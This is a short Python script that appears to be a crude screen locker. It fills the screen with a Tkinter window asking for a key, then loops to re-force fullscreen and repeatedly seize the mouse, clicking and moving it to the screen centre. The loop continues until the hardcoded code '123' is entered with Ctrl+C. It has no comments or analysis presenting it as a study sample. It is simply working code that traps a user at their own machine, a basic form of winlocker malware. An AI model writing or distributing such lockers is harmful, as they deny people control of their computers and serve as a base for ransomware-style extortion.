import pyautogui
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from time import sleep
def on_closing():
    click(width/2, height/2)
    moveTo(width/2, height/2)
    root.attributes("-fullscreen", True)
    root.update()
    root.bind('<Control-KeyPress-c>', callback)
def callback(event):
    global k, ent
    if ent.get()=='123':
        k=True
root=Tk()
width=root.winfo_screenwidth()
height=root.winfo_screenheight()
root.attributes("-fullscreen", True)
ent=Entry(root)
ent.place(width=150, heigh=50, x=width/2-75, y=height/2-25)
lab=Label(root, text="enter key and press Ctrl+C")
lab.place(x=width/2-75-130, y=height/2-25-100)
root.update()
sleep(0.2)
click(width/2, height/2)
k=False
while not k:
    on_closing()